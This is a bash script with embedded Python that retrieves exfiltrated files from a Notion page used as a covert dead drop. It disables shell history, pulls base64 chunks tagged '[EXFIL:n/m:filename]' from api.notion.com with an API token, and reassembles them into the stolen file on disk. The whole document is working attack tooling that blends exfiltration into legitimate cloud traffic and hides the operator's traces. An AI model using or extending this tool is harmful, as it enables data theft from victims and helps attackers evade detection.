#!/bin/bash
HISTFILE=/dev/null

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -f "$SCRIPT_DIR/.env" ]; then
    source "$SCRIPT_DIR/.env"
fi

if [ $# -lt 1 ] || [ $# -gt 2 ]; then
    echo "Usage: $0 <filename> [destination_path]"
    exit 1
fi

if [ -z "$TOKEN" ] || [ -z "$PAGE_ID" ]; then
    echo "[-] TOKEN and PAGE_ID must be set in .env"
    exit 1
fi

TARGET="$1"
DEST="${2:-.}"
echo "[*] Searching for: $TARGET"
echo "[*] Output dir  : $DEST"

EXFIL_TOKEN="$TOKEN" EXFIL_PAGE="$PAGE_ID" EXFIL_TARGET="$TARGET" EXFIL_DEST="$DEST" python3 - << 'PYEOF'
import json, os, sys, re, subprocess, base64

token  = os.environ['EXFIL_TOKEN']
page   = os.environ['EXFIL_PAGE']
target = os.environ['EXFIL_TARGET']
dest   = os.environ['EXFIL_DEST']

chunks = {}
cursor = None
has_more = True

while has_more:
    url = f"https://api.notion.com/v1/blocks/{page}/children?page_size=100"
    if cursor:
        url += f"&start_cursor={cursor}"

    result = subprocess.run(
        ['curl', '-s', url,
         '-H', f'Authorization: Bearer {token}',
         '-H', 'Notion-Version: 2022-06-28'],
        capture_output=True, text=True
    )
    response = json.loads(result.stdout)

    for block in response.get('results', []):
        try:
            for t in block.get('paragraph', {}).get('rich_text', []):
                m = re.match(r'\[EXFIL:(\d+)/(\d+):(.+?)\] (.+)', t.get('plain_text', ''))
                if m and m.group(3) == target:
                    chunks[int(m.group(1))] = m.group(4)
                    print(f"[+] Chunk {m.group(1)}/{m.group(2)} found")
        except:
            pass

    has_more = response.get('has_more', False)
    cursor = response.get('next_cursor')

if not chunks:
    print(f"[-] No data found for: {target}")
    sys.exit(1)

encoded = ''.join(chunks[k] for k in sorted(chunks))
decoded = base64.b64decode(encoded)

output_path = os.path.join(dest, target)
os.makedirs(dest, exist_ok=True)

with open(output_path, 'wb') as f:
    f.write(decoded)

print(f"[+] Reconstructed: {output_path} ({len(decoded)} bytes)")
PYEOF
